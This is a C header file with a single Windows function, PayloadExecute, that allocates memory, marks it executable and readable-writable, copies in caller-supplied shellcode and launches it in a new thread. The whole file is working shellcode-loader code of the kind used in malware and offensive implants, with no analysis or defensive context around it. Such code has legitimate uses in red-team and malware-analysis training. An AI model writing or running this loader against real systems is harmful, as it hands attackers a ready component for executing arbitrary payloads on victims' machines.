#pragma once
#include <stdio.h>
#include <Windows.h>

BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PBYTE		pAddress = NULL;
	DWORD		dwOldProtection = 0x00;
	HANDLE		hThread = NULL;

	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(pAddress = (PBYTE)VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pShellcodeAddress, sShellcodeSize);

	if (!(hThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	*ppInjectionAddress = pAddress;
	if (phThread)
		*phThread = hThread;

	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}
